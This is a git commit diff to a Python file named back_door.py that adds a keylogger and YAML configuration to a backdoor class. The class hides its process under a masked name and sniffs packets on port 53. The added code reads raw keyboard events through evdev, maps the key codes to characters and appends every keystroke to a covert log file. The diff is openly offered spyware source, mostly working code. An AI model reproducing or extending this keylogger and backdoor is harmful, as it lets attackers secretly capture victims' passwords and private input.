60619d18999844dcbe83b37de49d01463b4cee0e
Navin Parmar <navinparmar98@gmail.com>
2023-06-21 14:24:42 -0700

    Added yaml processing, also added keylogger

--- back_door.py
+++ back_door.py
@@ -7,6 +7,116 @@ from subprocess import run
 import sys
 import os
 import setproctitle
+import yaml
+import asyncio
+from evdev import InputDevice, ecodes, categorize
+import time
+
+key_code_map = {
+    0: '',
+    1: ' <ESC> ',
+    2: '1',
+    3: '2',
+    4: '3',
+    5: '4',
+    6: '5',
+    7: '6',
+    8: '7',
+    9: '8',
+    10: '9',
+    11: '0',
+    12: '-',
+    13: '=',
+    14: ' <BACKSPACE> ',
+    15: ' <TAB> ',
+    16: 'Q',
+    17: 'W',
+    18: 'E',
+    19: 'R',
+    20: 'T',
+    21: 'Y',
+    22: 'U',
+    23: 'I',
+    24: 'O',
+    25: 'P',
+    26: '[',
+    27: ']',
+    28: ' <ENTER> ',
+    29: ' <LEFTCTRL> ',
+    30: 'A',
+    31: 'S',
+    32: 'D',
+    33: 'F',
+    34: 'G',
+    35: 'H',
+    36: 'J',
+    37: 'K',
+    38: 'L',
+    39: ';',
+    40: "'",
+    41: '`',
+    42: ' <LEFTSHIFT> ',
+    43: '\\',
+    44: 'Z',
+    45: 'X',
+    46: 'C',
+    47: 'V',
+    48: 'B',
+    49: 'N',
+    50: 'M',
+    51: ',',
+    52: '.',
+    53: '/',
+    54: ' <RIGHTSHIFT> ',
+    55: '*',
+    56: ' <LEFTALT> ',
+    57: ' ',
+    58: ' <CAPSLOCK> ',
+    59: 'F1',
+    60: 'F2',
+    61: 'F3',
+    62: 'F4',
+    63: 'F5',
+    64: 'F6',
+    65: 'F7',
+    66: 'F8',
+    67: 'F9',
+    68: 'F10',
+    69: ' <NUMLOCK> ',
+    70: ' <SCROLLLOCK> ',
+    71: '7',
+    72: '8',
+    73: '9',
+    74: '-',
+    75: '4',
+    76: '5',
+    77: '6',
+    78: '+',
+    79: '1',
+    80: '2',
+    81: '3',
+    82: '0',
+    83: '.',
+    87: 'F11',
+    88: 'F12',
+    95: ',',
+    96: ' <ENTER> ',
+    97: ' <RIGHTCTRL> ',
+    98: '/',
+    100: ' <R_ALT> ',
+    102: ' <HOME> ',
+    103: ' <UP> ',
+    104: ' <PAGE_UP> ',
+    105: ' <KEY_LEFT> ',
+    106: ' <KEY_RIGHT> ',
+    107: ' <END> ',
+    108: ' <KEY_DOWN> ',
+    109: ' <PAGE_DOWN> ',
+    110: ' <INSERT> ',
+    111: ' <DELETE> ',
+    112: ' <MACRO> ',
+    125: ' <WINDOWS_KEY> '
+}
 
 class BackDoor:
     def __init__(self):
@@ -18,15 +128,46 @@ class BackDoor:
         self.port = 53
         self.client_port = 8888
         self.client = ""
-        self.masked_name = "MASKED_PROCESS"
+        self.masked_name = ""
+        self.log = ""
+        self.device = ""
 
     def start(self):
+        self.process_yaml()
         self.hide_process()
         print("Starting.....")
+        self.start_keylogger()
+        print("Keylogger started")
         print("Listening for packets")
         print("--------------------------------------------------------------")
+        time.sleep(15)
+        sys.exit()
         self.sniff_init()
 
+    def start_keylogger(self):
+        device = InputDevice(self.device)
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(self.keylog(device))
+
+    async def keylog(self, device):
+        with open(self.log, 'a+') as f:
+            async for event in device.async_read_loop():
+                if event.type == ecodes.EV_KEY and event.value == 1:
+                    try:
+                        f.write(key_code_map[event.code])
+                    except KeyError:
+                        f.write(f" <Unmapped keycode: {event.code}> ")
+
+    def process_yaml(self):
+        with open('config.yaml', 'r') as f:
+            config = yaml.safe_load(f)
+
+        self.masked_name = config['covert']['process_name']
+        self.log = config['covert']['log']
+        self.device = config['covert']['device']
+        print(f"Masked as {self.masked_name}")
+        print(f"log to {self.log}")
+        print(f"device is {self.device}")
 
     def craft_packet(self, msg: str):
         ip = IP(dst=self.client)
